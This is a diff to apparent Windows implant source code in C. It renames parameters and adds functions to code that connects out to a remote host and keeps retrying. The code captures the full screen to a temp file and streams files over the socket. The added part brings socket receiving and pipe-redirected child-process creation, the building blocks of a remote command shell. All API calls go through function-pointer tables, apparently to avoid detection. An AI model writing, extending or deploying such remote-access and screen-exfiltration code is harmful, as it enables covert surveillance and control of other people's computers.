@@ -8,11 +8,11 @@
 
 #include "mylibc.h"
 
-int startup_wsa(winsock_functions_t* ws_funcs)
+int startup_wsa(winsock_functions_t* ws2)
 {
 	WSADATA wsa_data;
 	int result = 1;
-	if ((result = ws_funcs->WSAStartup(MAKEWORD(2, 2), &wsa_data)) != 0)
+	if ((result = ws2->WSAStartup(MAKEWORD(2, 2), &wsa_data)) != 0)
 	{
 		return -1;
 	}
@@ -20,12 +20,12 @@ int startup_wsa(winsock_functions_t* ws_funcs)
 	return 0;
 }
 
-void cleanup_wsa(winsock_functions_t* ws_funcs)
+void cleanup_wsa(winsock_functions_t* ws2)
 {
-	ws_funcs->WSACleanup();
+	ws2->WSACleanup();
 }
 
-SOCKET init_connection(const char* hostname, int port, winsock_functions_t* ws_funcs, kernel32_functions_t* core_funcs)
+SOCKET init_connection(const char* hostname, int port, winsock_functions_t* ws2, kernel32_functions_t* kernel32)
 {
 	SOCKET server_socket = INVALID_SOCKET;
 	struct sockaddr_in server_addr = { 0 };
@@ -33,23 +33,23 @@ SOCKET init_connection(const char* hostname, int port, winsock_functions_t* ws_f
 
 	while(1)
 	{
-		server_socket = ws_funcs->Socket(AF_INET, SOCK_STREAM, 0);
+		server_socket = ws2->Socket(AF_INET, SOCK_STREAM, 0);
 		if (server_socket == INVALID_SOCKET)
 		{
 			return INVALID_SOCKET;
 		}
 
 		server_addr.sin_family = AF_INET;
-		server_addr.sin_port = ws_funcs->Htons(port);
-		if (ws_funcs->Inet_pton(AF_INET, hostname, &server_addr.sin_addr) <= 0)
+		server_addr.sin_port = ws2->Htons(port);
+		if (ws2->Inet_pton(AF_INET, hostname, &server_addr.sin_addr) <= 0)
 		{
 			return INVALID_SOCKET;
 		}
 
-		if (ws_funcs->Connect(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
+		if (ws2->Connect(server_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR)
 		{
-			ws_funcs->CloseSocket(server_socket);
-			core_funcs->Sleep(5000);
+			ws2->CloseSocket(server_socket);
+			kernel32->Sleep(5000);
 			continue;
 		}
 		break;
@@ -59,7 +59,7 @@ SOCKET init_connection(const char* hostname, int port, winsock_functions_t* ws_f
 
 }
 
-char* create_temp_filename(const char* basename, kernel32_functions_t* kernel_funcs)
+char* create_temp_filename(const char* basename, kernel32_functions_t* kernel32)
 {
 	DWORD tick_count;
 	int result = 0;
@@ -82,7 +82,7 @@ char* create_temp_filename(const char* basename, kernel32_functions_t* kernel_fu
 	basename_len = my_strlen(name);
 	name[basename_len] = '-';
 
-	tick_count = kernel_funcs->GetTickCount();
+	tick_count = kernel32->GetTickCount();
 	
 	my_lltoa(tick_count, name + (basename_len + 1), 10);
 
@@ -94,16 +94,12 @@ __cleanup:
 	return NULL;
 }
 
-int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel32_funcs, user32_functions_t* user32_funcs, gdi32_functions_t* gdi32_funcs)
+int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel32, user32_functions_t* user32, gdi32_functions_t* gdi32)
 {
-	if (kernel32_funcs == NULL || user32_funcs == NULL || gdi32_funcs == NULL)
+	if (kernel32 == NULL || user32 == NULL || gdi32 == NULL)
 	{
 		return -1;
 	}
-
-	gdi32_functions_t* gdi = gdi32_funcs;
-	user32_functions_t* user32 = user32_funcs;
-	kernel32_functions_t* kernel32 = kernel32_funcs;
 
 	HDC hdcScreen = NULL;
 	HDC hdcMemDC = NULL;
@@ -127,7 +123,7 @@ int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel3
 	}
 
 	// Create compatible DC
-	hdcMemDC = gdi->CreateCompatibleDC(hdcScreen);
+	hdcMemDC = gdi32->CreateCompatibleDC(hdcScreen);
 	if (!hdcMemDC)
 	{
 		user32->ReleaseDC(NULL, hdcScreen);
@@ -138,19 +134,19 @@ int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel3
 	int screen_height = user32->GetSystemMetrics(SM_CYSCREEN);
 
 	// Create compatible bitmap
-	hBitmap = gdi->CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
+	hBitmap = gdi32->CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
 	if (!hBitmap)
 	{
-		gdi->DeleteDC(hdcMemDC);
+		gdi32->DeleteDC(hdcMemDC);
 		user32->ReleaseDC(NULL, hdcScreen);
 		return -1;
 	}
 
 	// Select bitmap to MemDC
-	hOldBitmap = gdi->SelectObject(hdcMemDC, hBitmap);
+	hOldBitmap = gdi32->SelectObject(hdcMemDC, hBitmap);
 
 	// Copy screen to MemDC
-	if (!gdi->BitBlt(hdcMemDC, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY))
+	if (!gdi32->BitBlt(hdcMemDC, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY))
 	{
 		goto cleanup_0;
 	}
@@ -205,7 +201,7 @@ int capture_screenshot_win32(const char* filename, kernel32_functions_t* kernel3
 		goto cleanup;
 	}
 
-	if (!gdi->GetDIBits(hdcScreen, hBitmap, 0, (UINT)screen_height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS))
+	if (!gdi32->GetDIBits(hdcScreen, hBitmap, 0, (UINT)screen_height, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS))
 	{
 		goto cleanup;
 	}
@@ -234,18 +230,18 @@ cleanup:
 
 cleanup_0:
 
-	if (hOldBitmap) gdi->SelectObject(hdcMemDC, hOldBitmap);
-	if (hBitmap) gdi->DeleteObject(hBitmap);
-	if (hdcMemDC) gdi->DeleteDC(hdcMemDC);
+	if (hOldBitmap) gdi32->SelectObject(hdcMemDC, hOldBitmap);
+	if (hBitmap) gdi32->DeleteObject(hBitmap);
+	if (hdcMemDC) gdi32->DeleteDC(hdcMemDC);
 	if (hdcScreen) user32->ReleaseDC(NULL, hdcScreen);
 
 	return success ? 0 : -1;
 }
 
-int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs)
+int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel32)
 {
 	int result = 0;
-	if (kernel_funcs->DeleteFileA(filename))
+	if (kernel32->DeleteFileA(filename))
 		result = 0;
 	else
 		result = -1;
@@ -254,15 +250,15 @@ int cleanup_temp_file(const char* filename, kernel32_functions_t* kernel_funcs)
 	return result;
 }
 
-int send_data_over_socket(SOCKET socket, const char* buf, SIZE_T size, winsock_functions_t* ws, kernel32_functions_t* kernel32)
+int send_data(SOCKET socket, const char* buf, SIZE_T size, winsock_functions_t* ws2, kernel32_functions_t* kernel32)
 {
 	int result = 0;
 	while (1)
 	{
-		result = ws->Send(socket, buf, size, 0);
+		result = ws2->Send(socket, buf, size, 0);
 		if (result == SOCKET_ERROR)
 		{
-			int error = ws->WSAGetLastError();
+			int error = ws2->WSAGetLastError();
 
 			if (error == WSAEWOULDBLOCK)
 			{
@@ -284,9 +280,9 @@ int send_data_over_socket(SOCKET socket, const char* buf, SIZE_T size, winsock_f
 
 }
 
-int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions_t* ws, kernel32_functions_t* kernel32)
+int send_file(SOCKET socket, const char* filepath, winsock_functions_t* ws2, kernel32_functions_t* kernel32)
 {
-	if (ws == NULL || kernel32 == NULL)
+	if (ws2 == NULL || kernel32 == NULL)
 		return -1;
 
 	HANDLE hFile = INVALID_HANDLE_VALUE;
@@ -324,7 +320,7 @@ int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions
 	file_size.QuadPart = file_size_low;
 	UINT64 size_be = my_byteswap_uint64(file_size.QuadPart);
 
-	if (send_data_over_socket(socket, (const char*)&size_be, sizeof(UINT64), ws, kernel32) != 0)
+	if (send_data(socket, (const char*)&size_be, sizeof(UINT64), ws2, kernel32) != 0)
 	{
 		kernel32->CloseHandle(hFile);
 		return -1;
@@ -369,10 +365,10 @@ int send_file_over_socket(SOCKET socket, const char* filepath, winsock_functions
 		while (bytes_to_send > 0)
 		{
 
-			send_result = ws->Send(socket, (const char*)(buffer + bytes_sent), bytes_to_send, 0);
+			send_result = ws2->Send(socket, (const char*)(buffer + bytes_sent), bytes_to_send, 0);
 			if (send_result == SOCKET_ERROR)
 			{
-				int error = ws->WSAGetLastError();
+				int error = ws2->WSAGetLastError();
 
 				if (error == WSAEWOULDBLOCK)
 				{
@@ -419,4 +415,112 @@ cleanup:
 	}
 
 	return result;
+}
+
+int recv_data(SOCKET socket, char* buf, int len, winsock_functions_t* ws2, kernel32_functions_t* kernel32)
+{
+	if (ws2 == NULL || kernel32 == NULL)
+	{
+		return FALSE;
+	}
+
+	char* ptr = buf;
+	int total_received = 0;
+	
+	while (total_received < len)
+	{
+		int received = ws2->Recv(socket, (char*)(ptr + total_received), (int)(len - total_received), 0);
+		if (received == SOCKET_ERROR)
+		{
+			int error = ws2->WSAGetLastError();
+			return -1;
+		}
+		else if (received == 0)
+		{
+			return -1;
+		}
+		
+		total_received += received;
+	}
+	
+	return 0;
+}
+
+// 创建匿名管道
+BOOL CreatePipeWithSecurity(HANDLE* hReadPipe, HANDLE* hWritePipe) {
+	SECURITY_ATTRIBUTES saAttr;
+
+	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
+	saAttr.bInheritHandle = TRUE;  // 管道句柄可被子进程继承
+	saAttr.lpSecurityDescriptor = NULL;
+
+	return CreatePipe(hReadPipe, hWritePipe, &saAttr, 0);
+}
+
+
+
+// 从子进程读取输出
+DWORD ReadFromPipe(HANDLE hPipe, char* buffer, DWORD bufferSize) {
+	DWORD dwRead;
+	BOOL bSuccess = FALSE;
+
+	bSuccess = ReadFile(hPipe, buffer, bufferSize - 1, &dwRead, NULL);
+	if (!bSuccess || dwRead == 0) {
+		return 0;
+	}
+
+	buffer[dwRead] = '\0';  // 添加字符串结束符
+	return dwRead;
+}
+
+// 向子进程写入输入
+BOOL WriteToPipe(HANDLE hPipe, const char* data) {
+	DWORD dwWritten;
+	BOOL bSuccess = FALSE;
+
+	bSuccess = WriteFile(hPipe, data, strlen(data), &dwWritten, NULL);
+	return bSuccess;
+}
+
+// 创建子进程并重定向标准I/O
+BOOL CreateChildProcessWithRedirect(
+	LPSTR szCmdline,
+	HANDLE hStdIn,   // 子进程的标准输入
+	HANDLE hStdOut,  // 子进程的标准输出
+	HANDLE hStdErr   // 子进程的标准错误
+) {
+
+	PROCESS_INFORMATION piProcInfo;
+	STARTUPINFOA siStartInfo;
+	BOOL bSuccess = FALSE;
+
+	my_memset(&piProcInfo, 0, sizeof(PROCESS_INFORMATION));
+	my_memset(&siStartInfo, 0, sizeof(STARTUPINFO));
+
+	siStartInfo.cb = sizeof(STARTUPINFO);
+	siStartInfo.hStdError = hStdErr;
+	siStartInfo.hStdOutput = hStdOut;
+	siStartInfo.hStdInput = hStdIn;
+	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
+
+	bSuccess = CreateProcessA(
+		NULL,
+		szCmdline,
+		NULL,
+		NULL,
+		TRUE,
+		0,
+		NULL,
+		NULL, 
+		&siStartInfo,
+		&piProcInfo
+	);
+
+	if (bSuccess)
+	{
+		CloseHandle(piProcInfo.hProcess);
+		CloseHandle(piProcInfo.hThread);
+	}
+
+	return bSuccess;
 }
